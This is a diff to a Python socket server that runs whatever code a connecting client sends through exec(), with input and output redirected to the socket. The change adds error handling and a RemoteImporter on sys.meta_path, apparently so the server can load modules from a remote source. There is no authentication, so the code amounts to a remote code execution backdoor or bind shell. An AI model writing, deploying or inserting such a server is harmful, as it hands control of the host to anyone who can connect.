@@ -1,6 +1,7 @@
 import contextlib
 import socket
 import subprocess
+import sys
 import threading
 from utils import *
 
@@ -15,12 +16,18 @@ def handle_client(client_socket):
     client_socket.send(b'ACK!')
 
     with substitute_stdio(SocketIO(client_socket)):
-        exec(request)
+        try:
+            exec(request)
+        except Exception as e:
+            print('[!] Error occured', file=sys.__stdout__)
+            print(e, file=sys.__stdout__)
     client_socket.close()
     print('[*] connection closed')
 
 
 def main():
+    sys.meta_path.append(RemoteImporter())
+
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server.bind((bind_ip, bind_port))
     server.listen(5)
@@ -35,6 +42,7 @@ def main():
     except KeyboardInterrupt:
         print('\r',end='')
     except Exception as e:
+        print('[!] Error occured')
         print(e)
     finally:
         server.close()
